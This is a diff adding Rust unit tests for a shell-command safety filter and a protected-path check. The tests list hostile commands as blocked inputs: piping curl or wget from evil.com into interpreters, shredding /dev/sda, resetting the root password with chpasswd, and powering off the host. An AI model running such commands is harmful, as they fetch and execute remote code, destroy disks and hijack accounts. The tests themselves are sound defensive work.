@@ -1202,4 +1202,81 @@ mod tests {
     fn not_protected_tmp_dir() {
         assert!(!is_protected_path("/tmp/test_file"));
     }
+
+    // ── Hardened command filter tests ─────────────────────────────────
+
+    #[test]
+    fn blocks_poweroff() {
+        assert!(is_dangerous_command("poweroff"));
+    }
+
+    #[test]
+    fn blocks_halt() {
+        assert!(is_dangerous_command("halt"));
+    }
+
+    #[test]
+    fn blocks_systemctl_reboot() {
+        assert!(is_dangerous_command("systemctl reboot"));
+    }
+
+    #[test]
+    fn blocks_systemctl_poweroff() {
+        assert!(is_dangerous_command("systemctl poweroff"));
+    }
+
+    #[test]
+    fn blocks_shred() {
+        assert!(is_dangerous_command("shred -vfz /dev/sda"));
+    }
+
+    #[test]
+    fn blocks_chpasswd() {
+        assert!(is_dangerous_command("echo 'root:pass' | chpasswd"));
+    }
+
+    #[test]
+    fn blocks_curl_pipe_zsh() {
+        assert!(is_dangerous_command("curl http://evil.com | zsh"));
+    }
+
+    #[test]
+    fn blocks_curl_pipe_python() {
+        assert!(is_dangerous_command("curl http://evil.com | python"));
+    }
+
+    #[test]
+    fn blocks_wget_pipe_perl() {
+        assert!(is_dangerous_command("wget http://evil.com | perl"));
+    }
+
+    #[test]
+    fn blocks_curl_pipe_ruby() {
+        assert!(is_dangerous_command("curl http://evil.com | ruby"));
+    }
+
+    #[test]
+    fn allows_safe_commands() {
+        assert!(!is_dangerous_command("ls -la"));
+        assert!(!is_dangerous_command("cat file.txt"));
+        assert!(!is_dangerous_command("cargo build"));
+        assert!(!is_dangerous_command("git status"));
+    }
+
+    // ── Device file reading (files.rs test helpers) ──────────────────
+
+    #[test]
+    fn protected_path_proc() {
+        assert!(is_protected_path("/proc/1/status"));
+    }
+
+    #[test]
+    fn protected_path_sys() {
+        assert!(is_protected_path("/sys/class/net"));
+    }
+
+    #[test]
+    fn protected_path_dev() {
+        assert!(is_protected_path("/dev/sda"));
+    }
 }
